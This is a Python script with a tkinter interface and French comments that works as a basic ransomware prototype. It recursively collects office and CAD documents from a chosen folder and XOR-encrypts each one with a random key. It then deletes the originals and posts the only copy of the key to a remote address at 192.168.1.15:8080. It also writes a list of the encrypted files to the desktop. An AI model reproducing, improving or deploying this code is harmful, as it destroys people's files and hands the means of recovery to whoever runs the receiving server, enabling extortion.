import os
import random
import requests
import tkinter as tk
from tkinter import filedialog, messagebox
import glob

def search_documents():
    directory = filedialog.askdirectory()
    if directory:
        document_extensions = ["docx", "xlsx", "pptx", "pdf", "txt", "odt", "ods", "odp", "dwg"]
        search_pattern = os.path.join(directory, "**", "*.*")
        documents = set()
        for extension in document_extensions:
            documents.update(set(glob.glob(search_pattern, recursive=True)))

        # Filtrer les documents par extension
        filtered_documents = [document for document in documents if os.path.splitext(document)[1][1:].lower() in document_extensions]

        file_entry.delete(1.0, tk.END)  # Efface le contenu existant dans le champ d'entrée
        for document in filtered_documents:
            file_entry.insert(tk.END, '"' + document + '"\n')

def encrypt_documents():
    # Chemin du fichier contenant la liste des documents à chiffrer
    file_paths = file_entry.get(1.0, tk.END).splitlines()

    # Génération de la clé de chiffrement aléatoire
    encryption_key = ''.join(random.choices('0123456789abcdef', k=16))

    # Liste pour stocker les chemins des documents chiffrés
    encrypted_documents = []

    # Chiffrement des documents, placement des documents chiffrés et suppression des documents originaux
    for document_path in file_paths:
        # Suppression des guillemets autour du chemin du document
        document_path = document_path.strip('"')

        try:
            # Vérification si le document existe
            if os.path.exists(document_path):
                # Chiffrement du document avec la clé générée aléatoirement
                encrypted_document_path = document_path + ".encrypted"
                with open(document_path, 'rb') as input_file, open(encrypted_document_path, 'wb') as output_file:
                    # Lecture du contenu du fichier
                    content = input_file.read()

                    # Chiffrement du contenu avec la clé générée aléatoirement
                    encrypted_content = encrypt_content(content, encryption_key)

                    # Écriture du contenu chiffré dans le fichier de sortie
                    output_file.write(encrypted_content)

                # Ajout du chemin du document chiffré à la liste
                encrypted_documents.append(encrypted_document_path)

                # Suppression du document original
                os.remove(document_path)
            else:
                status_label.config(text="Le document n'existe plus : " + document_path)
                continue

        except Exception as e:
            status_label.config(text="Une erreur s'est produite lors du traitement du document : " + document_path)
            messagebox.showerror("Erreur", "Une erreur s'est produite lors du traitement des documents.")
            return

    # Envoi de la clé de chiffrement à l'URL spécifiée
    url = "http://192.168.1.15:8080/clé"
    try:
        response = requests.post(url, data=encryption_key)
        if response.status_code == 200:
            status_label.config(text="La clé de chiffrement a été envoyée avec succès à l'URL : " + url)
        else:
            status_label.config(text="Une erreur s'est produite lors de l'envoi de la clé de chiffrement à l'URL : " + url)
    except Exception as e:
        status_label.config(text="Une erreur s'est produite lors de l'envoi de la clé de chiffrement à l'URL : " + url)
        messagebox.showerror("Erreur", "Une erreur s'est produite lors de l'envoi de la clé de chiffrement.")

    # Chemin du fichier TXT pour enregistrer la liste des documents chiffrés
    output_file_path = os.path.expanduser("~/Desktop/documents_chiffrés.txt")

    # Écriture de la liste des documents chiffrés dans le fichier TXT
    with open(output_file_path, 'w') as output_file:
        for encrypted_document in encrypted_documents:
            output_file.write(encrypted_document + "\n")

    status_label.config(text="Le script s'est terminé avec succès. La liste des documents chiffrés a été enregistrée dans : " + output_file_path)
    messagebox.showinfo("Terminé", "Le script s'est terminé avec succès.")

def encrypt_content(content, key):
    # Ici, vous pouvez utiliser un algorithme de chiffrement de votre choix pour chiffrer le contenu du fichier
    # Assurez-vous d'utiliser une méthode de chiffrement appropriée et sécurisée
    # Dans cet exemple, nous utilisons un simple chiffrement XOR

    encrypted_content = bytearray()
    key_length = len(key)
    for i, byte in enumerate(content):
        encrypted_byte = byte ^ ord(key[i % key_length])
        encrypted_content.append(encrypted_byte)

    return encrypted_content

# Création de la fenêtre principale
window = tk.Tk()
window.title("Chiffrement de documents")
window.geometry("400x250")

# Bouton pour rechercher les documents bureautiques et professionnels
search_button = tk.Button(window, text="Rechercher des documents", command=search_documents)
search_button.pack()

# Étiquette et champ d'entrée pour le chemin du fichier
file_label = tk.Label(window, text="Liste des documents à chiffrer:")
file_label.pack()

file_entry = tk.Text(window, width=50, height=6)
file_entry.pack()

# Étiquette pour afficher le statut
status_label = tk.Label(window, text="En attente...")
status_label.pack()

# Bouton pour lancer le chiffrement des documents
encrypt_button = tk.Button(window, text="Chiffrer les documents", command=encrypt_documents)
encrypt_button.pack()

# Lancement de la boucle principale de la fenêtre
window.mainloop()
